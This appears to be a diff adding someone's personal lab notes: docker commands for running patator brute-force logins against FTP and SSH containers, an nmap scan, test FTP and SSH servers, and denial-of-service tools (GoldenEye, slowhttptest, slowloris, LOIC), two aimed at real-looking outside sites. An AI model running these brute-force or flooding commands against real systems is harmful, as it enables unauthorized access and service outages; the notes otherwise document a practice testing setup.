@@ -1,0 +1,74 @@
+
+
+
+this one works
+use command 'containerips' to get webservice address
+need to be in wordlist directory
+docker run -it --rm  -v $PWD:/mnt patator ftp_login host=172.17.0.2 user=FILE0 password=FILE1 0=/mnt/usernames.txt 1=/mnt/passlist.txt -x  ignore:mesg='Login incorrect.'
+
+
+
+
+
+
+ssh patator (not currently working) need to be in wordlist directory
+
+
+docker run -it --rm  -v $PWD:/mnt patator ssh_login port=22 host=172.19.0.2 user=FILE0 password=FILE1 0=/mnt/namelistsmall.txt 1=/mnt/passlistsmall.txt --max-retries 0 --timeout 10 -x ignore:time=0-3 
+
+
+nmap 
+
+docker run --rm -it instrumentisto/nmap -sS 127.0.0.1
+-sS this can change dependent on type of scan you want to use see nmap command on chrom
+127.0.0.1 example ip to scan
+this command "docker run --rm -it instrumentisto/nmap" basically replaces using nmap in "nmap -sS 127.0.0.1"
+
+
+linux server (open-ssh)
+
+docker compose -f openssh-server.yaml up -d
+
+ftp server
+
+docker run -e FTP_USER=username -e FTP_PASS=password fauria/vsftpd
+
+run the ftp server using these commands
+
+
+dos goldeneye
+
+ docker run haibbi/fire-in-the-hole ./goldeneye.py https://hucker.com/r/haibbi/fire-in-the-hole
+
+dos slowhttp test
+docker run frapsoft/slowhttptest -u http://www.testingmcafeesites.com/index.html
+so far only works on http not https
+
+
+openssl 
+ docker run -it frapsoft/openssl
+
+
+slowloris
+
+docker run --rm aminvakil/slowloris example.com 
+example.com being the url
+
+httpd
+cd into httpd
+run
+docker build -t my-apache2 .
+docker run -dit --name my-running-app -p 8080:80 my-apache2
+
+
+to run LOIC
+run ./loic-net4.0.sh
+then
+./loic.sh
+
+
+
+
+
+
+
